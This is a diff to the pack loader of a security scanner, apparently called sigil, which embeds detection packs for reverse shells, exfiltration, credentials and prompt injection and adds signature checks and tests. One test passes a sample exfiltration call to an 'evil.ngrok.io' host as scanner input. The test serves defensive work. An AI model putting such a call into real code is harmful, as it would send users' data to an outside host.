@@ -13,17 +13,37 @@ use super::signing::PackVerifier;
 /// Using separate constants keeps the compiler error local when a file is
 /// missing.
 const EMBEDDED_PACKS: &[&str] = &[
-    include_str!("../../../packs/core/v1/install_hooks.json"),
-    include_str!("../../../packs/core/v1/code_patterns.json"),
-    include_str!("../../../packs/core/v1/network_exfil.json"),
-    include_str!("../../../packs/core/v1/creds.json"),
-    include_str!("../../../packs/core/v1/obfuscation.json"),
-    include_str!("../../../packs/core/v1/obfuscation_chain.json"),
-    include_str!("../../../packs/core/v1/provenance.json"),
-    include_str!("../../../packs/core/v1/prompt_injection.json"),
-    include_str!("../../../packs/core/v1/skill_security.json"),
-    include_str!("../../../packs/core/v1/inference_security.json"),
-    include_str!("../../../packs/core/v1/supply_chain.json"),
+    include_str!("../../packs/core/v1/install_hooks.json"),
+    include_str!("../../packs/core/v1/code_patterns.json"),
+    include_str!("../../packs/core/v1/network_exfil.json"),
+    include_str!("../../packs/core/v1/creds.json"),
+    include_str!("../../packs/core/v1/obfuscation.json"),
+    include_str!("../../packs/core/v1/obfuscation_chain.json"),
+    include_str!("../../packs/core/v1/provenance.json"),
+    include_str!("../../packs/core/v1/prompt_injection.json"),
+    include_str!("../../packs/core/v1/skill_security.json"),
+    include_str!("../../packs/core/v1/inference_security.json"),
+    include_str!("../../packs/core/v1/supply_chain.json"),
+    // Reverse/bind-shell corpus generated from the MIT-licensed
+    // reverse-shell-generator. Regenerate via tools/corpus-gen/.
+    //
+    // NOTE: the GTFOBins / LOLBAS LOLBin packs are deliberately NOT embedded
+    // here — they are GPL-3.0 and ship as the optional, separately-distributed
+    // bundle in packs/lolbin/v1/ (loaded at runtime from ~/.sigil/packs/). See
+    // packs/lolbin/v1/NOTICE.md and tools/corpus-gen/README.md.
+    include_str!("../../packs/core/v1/reverse_shells.json"),
+    include_str!("../../packs/core/v1/persistence.json"),
+    include_str!("../../packs/core/v1/agent_manipulation.json"),
+    // Prompt injection written in languages other than English.
+    include_str!("../../packs/core/v1/multilingual_injection.json"),
+    include_str!("../../packs/core/v1/agent_supply_chain.json"),
+    include_str!("../../packs/core/v1/agent_instructions.json"),
+    // Disabled TLS certificate verification (TLS-*): configuration hygiene,
+    // Medium on its own, High when a credential rides the connection.
+    include_str!("../../packs/core/v1/insecure_transport.json"),
+    // Metadata for the structural checks implemented in Rust
+    // (scanner::bytecode, artifacts, padding, lpriv); no regex rules.
+    include_str!("../../packs/core/v1/structural.json"),
 ];
 
 /// Verify the signature embedded in `raw` pack JSON, governed by the
@@ -95,16 +115,32 @@ fn pack_has_signature(raw: &str) -> bool {
         .unwrap_or(false)
 }
 
-/// Load all packs: embedded core packs plus any user-installed packs.
+/// Load all packs: embedded core packs, the released corpus, user-installed
+/// packs, and then any custom packs named for this run (`--rules`, a scan
+/// policy's `rule_packs`; see [`super::custom`]).
 ///
 /// Embedded pack parse failures are logged with a `[SECURITY]` prefix because
 /// they indicate binary corruption (the packs are bundled at compile time).
-/// User-installed pack failures are also logged; see `load_packs_from_dir`.
-pub fn load_all_packs() -> Vec<SignaturePack> {
+/// User-installed pack signature failures are propagated as `Err` so the
+/// caller can abort the scan; see `load_packs_from_dir`.
+pub fn load_all_packs() -> Result<Vec<SignaturePack>, String> {
+    let mut packs = load_base_packs()?;
+    // 4. Custom packs for this run. Additive only: they can never supersede a
+    //    pack loaded above (see `custom::check_against`).
+    super::custom::append_registered(&mut packs)?;
+    Ok(packs)
+}
+
+/// Every pack except this run's custom packs: embedded, released and user.
+pub fn load_base_packs() -> Result<Vec<SignaturePack>, String> {
     let mut packs: Vec<SignaturePack> = Vec::new();
 
-    // 1. Embedded packs (always available; not signature-verified — their
-    //    integrity is guaranteed by the binary build process).
+    // 1. Embedded packs — the bootstrap corpus.
+    //
+    // These are not signature-verified: their integrity comes from the binary
+    // build. They guarantee a working scanner on first run, offline, and in
+    // air-gapped environments, and they are the floor a released corpus is
+    // measured against.
     for raw in EMBEDDED_PACKS {
         match serde_json::from_str::<SignaturePack>(raw) {
             Ok(pack) => packs.push(pack),
@@ -116,41 +152,162 @@ pub fn load_all_packs() -> Vec<SignaturePack> {
         }
     }
 
-    // 2. User-installed packs from ~/.sigil/packs/
-    if let Some(user_packs) = user_packs_dir() {
-        packs.extend(load_packs_from_dir(&user_packs));
+    // 2. The released core corpus from ~/.sigil/corpus/, when present.
+    //
+    // ADR-0005 committed to signature updates becoming data-plane — shipped
+    // and versioned independently of the binary. Embedding the core packs at
+    // compile time meant a rule change still required a release. A pack here
+    // supersedes the embedded pack with the same `meta.id`, so the corpus can
+    // move at its own cadence while the binary stays put.
+    //
+    // Signature verification applies (see `verify_pack_if_keyed`): a released
+    // corpus is exactly the thing an attacker would want to substitute.
+    if let Some(corpus_dir) = released_corpus_dir() {
+        let released = load_packs_from_dir(&corpus_dir)?;
+        for pack in released {
+            supersede(&mut packs, pack);
+        }
     }
 
-    packs
+    // 3. User-installed packs from ~/.sigil/packs/ (org rules, the optional
+    //    GPL LOLBin bundle). These also supersede by id, so a team can pin a
+    //    replacement for a core pack rather than fighting it with
+    //    suppressions.
+    if let Some(user_packs) = user_packs_dir() {
+        for pack in load_packs_from_dir(&user_packs)? {
+            supersede(&mut packs, pack);
+        }
+    }
+
+    Ok(packs)
+}
+
+/// Replace any existing pack with the same `meta.id`, otherwise append.
+///
+/// Superseding by id rather than merging keeps the active rule set
+/// unambiguous: exactly one pack answers for a given id, so the corpus digest
+/// recorded in scan output identifies precisely what ran.
+fn supersede(packs: &mut Vec<SignaturePack>, incoming: SignaturePack) {
+    if let Some(slot) = packs.iter_mut().find(|p| p.meta.id == incoming.meta.id) {
+        *slot = incoming;
+    } else {
+        packs.push(incoming);
+    }
+}
+
+/// Returns `~/.sigil/corpus/` — the released core corpus directory.
+pub fn released_corpus_dir() -> Option<PathBuf> {
+    dirs::home_dir().map(|h| h.join(".sigil").join("corpus"))
+}
+
+/// Where each active pack came from, for `sigil corpus`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum PackOrigin {
+    /// Compiled into the binary.
+    Embedded,
+    /// Released corpus in `~/.sigil/corpus/`.
+    Released,
+    /// User-installed pack in `~/.sigil/packs/`.
+    User,
+    /// Named for this run by `--rules` or a scan policy's `rule_packs`.
+    Custom,
+}
+
+impl std::fmt::Display for PackOrigin {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str(match self {
+            PackOrigin::Embedded => "embedded",
+            PackOrigin::Released => "released",
+            PackOrigin::User => "user",
+            PackOrigin::Custom => "custom",
+        })
+    }
+}
+
+/// The active packs with their origin, in load order.
+///
+/// Mirrors `load_all_packs` so `sigil corpus` reports exactly what a scan
+/// would run, including which embedded packs have been superseded.
+pub fn load_all_packs_with_origin() -> Result<Vec<(SignaturePack, PackOrigin)>, String> {
+    let mut packs: Vec<(SignaturePack, PackOrigin)> = Vec::new();
+
+    for raw in EMBEDDED_PACKS {
+        if let Ok(pack) = serde_json::from_str::<SignaturePack>(raw) {
+            packs.push((pack, PackOrigin::Embedded));
+        }
+    }
+
+    let mut apply = |incoming: SignaturePack, origin: PackOrigin| {
+        if let Some(slot) = packs
+            .iter_mut()
+            .find(|(p, _)| p.meta.id == incoming.meta.id)
+        {
+            *slot = (incoming, origin);
+        } else {
+            packs.push((incoming, origin));
+        }
+    };
+
+    if let Some(dir) = released_corpus_dir() {
+        for pack in load_packs_from_dir(&dir)? {
+            apply(pack, PackOrigin::Released);
+        }
+    }
+    if let Some(dir) = user_packs_dir() {
+        for pack in load_packs_from_dir(&dir)? {
+            apply(pack, PackOrigin::User);
+        }
+    }
+    for custom in super::custom::registered() {
+        packs.push((custom.pack, PackOrigin::Custom));
+    }
+
+    Ok(packs)
 }
 
 /// Load packs from a directory.
 ///
-/// Non-JSON files are skipped silently. Parse errors and signature failures
-/// are logged to stderr and the offending pack is rejected — a tampered or
-/// unsigned pack never reaches the engine.
-pub fn load_packs_from_dir(dir: &Path) -> Vec<SignaturePack> {
+/// Non-JSON files are skipped silently. I/O and parse errors are logged to
+/// stderr and the offending pack is skipped. Signature verification failures
+/// are **fatal**: when `SIGIL_PACK_PUBLIC_KEY` is configured, a pack that
+/// fails verification is evidence of tampering — the caller must abort rather
+/// than continue with a degraded rule set.
+pub fn load_packs_from_dir(dir: &Path) -> Result<Vec<SignaturePack>, String> {
     let mut packs = Vec::new();
 
     let entries = match std::fs::read_dir(dir) {
         Ok(e) => e,
-        Err(_) => return packs,
+        Err(_) => return Ok(packs),
     };
 
     for entry in entries.filter_map(|e| e.ok()) {
         let path = entry.path();
         if path.extension().and_then(|e| e.to_str()) != Some("json") {
+            // A YARA file here would otherwise be a rule that silently never
+            // runs: say where YARA files are read from.
+            if super::yara::is_yara_path(&path) {
+                eprintln!(
+                    "[corpus] skipping {}: YARA files are not read from this directory; \
+                     pass them with --rules, or list them under rule_packs in a scan or \
+                     organisation policy",
+                    path.display()
+                );
+            }
             continue;
         }
         match load_pack_from_file(&path) {
             Ok(pack) => packs.push(pack),
+            Err(e) if e.contains("[SECURITY]") => {
+                eprintln!("[corpus] {}: {e}", path.display());
+                return Err(e);
+            }
             Err(e) => {
                 eprintln!("[corpus] skipping {}: {e}", path.display());
             }
         }
     }
 
-    packs
+    Ok(packs)
 }
 
 /// Parse (and signature-verify) a single user pack from a file path.
@@ -162,7 +319,22 @@ pub fn load_pack_from_file(path: &Path) -> Result<SignaturePack, String> {
     // Verify before deserialising — a tampered pack must be rejected before
     // its rules reach the engine, not after.
     verify_pack_if_keyed(&raw)?;
-    serde_json::from_str::<SignaturePack>(&raw).map_err(|e| format!("parse error: {e}"))
+    let pack =
+        serde_json::from_str::<SignaturePack>(&raw).map_err(|e| format!("parse error: {e}"))?;
+    validate_exemptions(&pack)?;
+    Ok(pack)
+}
+
+/// Refuse a pack whose match-local suppression predicates cannot be
+/// evaluated as written (see [`super::exempt::validate`]): a `value_matches`
+/// with no `value` group to read, or a `same` pair naming a group that does
+/// not exist, would otherwise silently never exempt anything.
+pub fn validate_exemptions(pack: &SignaturePack) -> Result<(), String> {
+    for rule in &pack.rules {
+        super::exempt::validate(&rule.pattern, &rule.suppress)
+            .map_err(|e| format!("rule {}: suppress: {e}", rule.id))?;
+    }
+    Ok(())
 }
 
 /// Returns `~/.sigil/packs/` when the home directory can be determined.
@@ -175,11 +347,10 @@ mod tests {
     use super::*;
     use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
     use ed25519_dalek::{Signer, SigningKey};
-    use std::sync::Mutex;
-
     // Serialise tests that mutate SIGIL_PACK_PUBLIC_KEY so parallel test
-    // runners don't race on the env var.
-    static ENV_LOCK: Mutex<()> = Mutex::new(());
+    // runners don't race on the env var. Shared with the custom-pack tests,
+    // which read the same variable.
+    use crate::corpus::custom::PACK_KEY_ENV_LOCK as ENV_LOCK;
 
     // -----------------------------------------------------------------------
     // Helpers shared across signing tests
@@ -382,7 +553,7 @@ mod tests {
     #[test]
     fn corpus_loader_embedded_packs_parse() {
         // All embedded pack JSON must be valid and contain at least one rule.
-        let packs = load_all_packs();
+        let packs = load_all_packs().expect("embedded packs must parse");
         assert!(
             !packs.is_empty(),
             "corpus_loader: no packs loaded from embedded data"
@@ -393,13 +564,43 @@ mod tests {
                 "pack has empty id: {:?}",
                 pack.meta
             );
-            let has_rules = !pack.rules.is_empty() || !pack.provenance_rules.is_empty();
+            // A pack of engine_rules (metadata for checks implemented in
+            // Rust, e.g. structural.json) counts: it documents live rules.
+            let has_rules = !pack.rules.is_empty()
+                || !pack.provenance_rules.is_empty()
+                || !pack.engine_rules.is_empty();
             assert!(
                 has_rules,
                 "pack '{}' has no rules or provenance_rules",
                 pack.meta.id
             );
         }
+    }
+
+    #[test]
+    fn signing_keyed_fatal_on_signature_failure() {
+        let _lock = ENV_LOCK.lock().unwrap();
+        let (_, vk) = test_keypair();
+        std::env::set_var("SIGIL_PACK_PUBLIC_KEY", hex_key(&vk));
+
+        // Write an unsigned pack to a temp directory.
+        let dir = tempfile::tempdir().expect("tempdir");
+        let pack_path = dir.path().join("unsigned.json");
+        let raw = serde_json::to_string(&minimal_pack_json()).unwrap();
+        std::fs::write(&pack_path, &raw).unwrap();
+
+        let result = load_packs_from_dir(dir.path());
+        std::env::remove_var("SIGIL_PACK_PUBLIC_KEY");
+
+        assert!(
+            result.is_err(),
+            "load_packs_from_dir must return Err when a pack fails signature verification"
+        );
+        let msg = result.unwrap_err();
+        assert!(
+            msg.contains("[SECURITY]"),
+            "error must carry [SECURITY] tag; got: {msg}"
+        );
     }
 
     #[test]
@@ -446,6 +647,93 @@ mod tests {
         assert!(!f.matches("server.yaml"));
     }
 
+    /// `evidence` is optional and additive: a rule that omits it must parse
+    /// and mean `standalone`, or every pack written before the field existed
+    /// silently changes meaning.
+    #[test]
+    fn corpus_loader_evidence_defaults_to_standalone() {
+        use crate::corpus::schema::{Evidence, PackRule};
+        let without: PackRule = serde_json::from_value(serde_json::json!({
+            "id": "TEST-001",
+            "phase": "credentials",
+            "severity": "critical",
+            "pattern": "secret",
+            "description": "test"
+        }))
+        .expect("rule without evidence parses");
+        assert_eq!(without.evidence, Evidence::Standalone);
+        assert!(without.evidence.is_standalone());
+    }
+
+    #[test]
+    fn corpus_loader_evidence_parses_both_values() {
+        use crate::corpus::schema::{Evidence, PackRule};
+        let mut doc = serde_json::json!({
+            "id": "TEST-002",
+            "phase": "credentials",
+            "severity": "critical",
+            "pattern": "secret",
+            "description": "test",
+            "evidence": "corroborate"
+        });
+        let corroborate: PackRule =
+            serde_json::from_value(doc.clone()).expect("corroborate parses");
+        assert_eq!(corroborate.evidence, Evidence::Corroborate);
+        assert!(!corroborate.evidence.is_standalone());
+
+        doc["evidence"] = serde_json::json!("standalone");
+        let standalone: PackRule = serde_json::from_value(doc).expect("standalone parses");
+        assert_eq!(standalone.evidence, Evidence::Standalone);
+    }
+
+    /// An unknown value must be a loud parse error, not a silent downgrade to
+    /// the default: a typo'd `"corroborrate"` that quietly meant `standalone`
+    /// would re-arm the verdict the pack author was trying to disarm.
+    #[test]
+    fn corpus_loader_unknown_evidence_value_is_rejected() {
+        use crate::corpus::schema::PackRule;
+        let bad = serde_json::from_value::<PackRule>(serde_json::json!({
+            "id": "TEST-003",
+            "phase": "credentials",
+            "severity": "critical",
+            "pattern": "secret",
+            "description": "test",
+            "evidence": "corroborrate"
+        }));
+        assert!(bad.is_err(), "a misspelled evidence value must not parse");
+    }
+
+    /// The shipped corpus must round-trip the field: whatever rules declare
+    /// `corroborate` today, they must still declare it after a load.
+    #[test]
+    fn corpus_loader_shipped_packs_carry_declared_evidence() {
+        use crate::corpus::schema::Evidence;
+        let packs = load_all_packs().expect("embedded packs load");
+        let corroborating: Vec<&str> = packs
+            .iter()
+            .flat_map(|p| p.rules.iter())
+            .filter(|r| r.evidence == Evidence::Corroborate)
+            .map(|r| r.id.as_str())
+            .collect();
+        assert!(
+            !corroborating.is_empty(),
+            "the shipped corpus is expected to mark at least one Critical rule \
+             as corroborating evidence"
+        );
+        for id in &corroborating {
+            let rule = packs
+                .iter()
+                .flat_map(|p| p.rules.iter())
+                .find(|r| r.id == *id)
+                .expect("rule found");
+            assert_eq!(
+                rule.severity.to_lowercase(),
+                "critical",
+                "{id}: evidence only means anything on a critical rule"
+            );
+        }
+    }
+
     #[test]
     fn corpus_loader_suppression_path_contains() {
         use crate::corpus::schema::SuppressionPredicates;
@@ -484,5 +772,76 @@ mod tests {
             r#"requests.get("https://evil.ngrok.io/exfil")"#,
             ""
         ));
+    }
+}
+
+#[cfg(test)]
+mod precedence_tests {
+    use super::*;
+    use crate::corpus::schema::{PackMeta, SignaturePack};
+
+    fn pack(id: &str, version: &str) -> SignaturePack {
+        SignaturePack {
+            meta: PackMeta {
+                id: id.to_string(),
+                name: id.to_string(),
+                version: version.to_string(),
+                updated_at: "2026-08-30".to_string(),
+                author: "test".to_string(),
+                description: "test".to_string(),
+            },
+            rules: Vec::new(),
+            provenance_rules: Vec::new(),
+            correlation_rules: Vec::new(),
+            engine_rules: Vec::new(),
+            yara: None,
+        }
+    }
+
+    /// A released pack replaces the embedded pack with the same id, rather
+    /// than both being active. Exactly one pack must answer for an id, or the
+    /// corpus digest no longer identifies what ran.
+    #[test]
+    fn released_pack_supersedes_embedded_by_id() {
+        let mut packs = vec![
+            pack("sigil-core-credentials", "1.0.0"),
+            pack("other", "1.0.0"),
+        ];
+        supersede(&mut packs, pack("sigil-core-credentials", "2.0.0"));
+
+        assert_eq!(packs.len(), 2, "supersede must replace, not append");
+        let creds = packs
+            .iter()
+            .find(|p| p.meta.id == "sigil-core-credentials")
+            .expect("pack present");
+        assert_eq!(creds.meta.version, "2.0.0");
+    }
+
+    #[test]
+    fn unknown_id_is_appended() {
+        let mut packs = vec![pack("a", "1.0.0")];
+        supersede(&mut packs, pack("b", "1.0.0"));
+        assert_eq!(packs.len(), 2);
+    }
+
+    #[test]
+    fn embedded_corpus_is_the_bootstrap_floor() {
+        // With no released or user packs on this machine, load_all_packs must
+        // still return a working corpus — offline and air-gapped use.
+        let packs = load_all_packs().expect("embedded packs load");
+        assert!(
+            packs.len() >= EMBEDDED_PACKS.len(),
+            "expected at least the embedded packs, got {}",
+            packs.len()
+        );
+        assert!(packs.iter().any(|p| !p.rules.is_empty()));
+    }
+
+    #[test]
+    fn origins_are_reported_for_every_active_pack() {
+        let packs = load_all_packs_with_origin().expect("load");
+        assert!(!packs.is_empty());
+        // Nothing installed in the test environment, so all should be embedded.
+        assert!(packs.iter().all(|(_, o)| *o == PackOrigin::Embedded));
     }
 }
